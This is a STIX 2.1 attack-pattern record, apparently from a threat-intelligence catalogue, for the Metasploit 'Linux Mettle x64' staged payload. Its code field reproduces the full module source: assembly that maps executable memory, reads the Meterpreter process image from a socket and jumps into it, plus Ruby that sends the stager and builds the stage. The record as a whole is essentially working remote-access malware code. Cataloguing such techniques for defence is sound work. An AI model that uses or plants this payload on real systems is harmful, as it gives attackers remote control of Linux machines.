{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6e801b28-9612-44cf-8691-9a773e3600fc",
    "created": "2024-08-14T16:33:19.271536Z",
    "modified": "2024-08-14T16:33:19.27154Z",
    "name": "Linux Mettle x64",
    "description": "Inject the mettle server payload (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/linux/x64/meterpreter.rb",
            "external_id": "meterpreter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/elfparsey'\n\nmodule MetasploitModule\n  include Msf::Sessions::MeterpreterOptions\n  include Msf::Sessions::MettleConfig\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'          => 'Linux Mettle x64',\n        'Description'   => 'Inject the mettle server payload (staged)',\n        'Author'        => [\n          'Brent Cook <bcook[at]rapid7.com>'\n        ],\n        'Platform'      => 'Linux',\n        'Arch'          => ARCH_X64,\n        'License'       => MSF_LICENSE,\n        'Session'       => Msf::Sessions::Meterpreter_x64_Linux\n      )\n    )\n  end\n\n  def elf_ep(payload)\n    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))\n    elf.elf_header.e_entry\n  end\n\n  def asm_intermediate_stage(payload)\n    entry_offset = elf_ep(payload)\n\n    %(\n      push rdi                    ; save sockfd\n      xor rdi, rdi                ; address\n      mov rsi, #{payload.length}  ; length\n      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE\n      mov r10, 0x22               ; MAP_PRIVATE | MAP_ANONYMOUS\n      xor r8, r8                  ; fd\n      xor r9, r9                  ; offset\n      mov rax, 0x9                ; mmap\n      syscall\n\n      ; receive mettle process image\n      mov rdx, rsi                ; length\n      mov rsi, rax                ; address\n      pop rdi                     ; sockfd\n      mov r10, 0x100              ; MSG_WAITALL\n      xor r8, r8                  ; srcaddr\n      xor r9, r9                  ; addrlen\n      mov rax, 45                 ; recvfrom\n      syscall\n\n      ; setup stack\n      and rsp, -0x10              ; Align\n      add sp, 80                  ; Add room for initial stack and prog name\n      mov rax, 109                ; prog name \"m\"\n      push rax                    ;\n      mov rcx, rsp                ; save the stack\n      xor rbx, rbx\n      push rbx                    ; NULL\n      push rbx                    ; AT_NULL\n      push rsi                    ; mmap'd address\n      mov rax, 7                  ; AT_BASE\n      push rax\n      push rbx                    ; end of ENV\n      push rbx                    ; NULL\n      push rdi                    ; ARGV[1] int sockfd\n      push rcx                    ; ARGV[0] char *prog_name\n      mov rax, 2                  ; ARGC\n      push rax\n\n      ; down the rabbit hole\n      mov rax, #{entry_offset}\n      add rsi, rax\n      jmp rsi\n    )\n  end\n\n  def generate_intermediate_stage(payload)\n    Metasm::Shellcode.assemble(Metasm::X64.new, asm_intermediate_stage(payload)).encode_string\n  end\n\n  def handle_intermediate_stage(conn, payload)\n    midstager = generate_intermediate_stage(payload)\n    vprint_status(\"Transmitting intermediate stager...(#{midstager.length} bytes)\")\n    conn.put(midstager) == midstager.length\n  end\n\n  def generate_stage(opts = {})\n    config_opts = {scheme: 'tcp'}.merge(mettle_logging_config(opts))\n    MetasploitPayloads::Mettle.new('x86_64-linux-musl',\n      generate_config(opts.merge(config_opts))).to_binary :process_image\n  end\nend\n",
    "x_mitre_platforms": [
        "Linux'"
    ]
}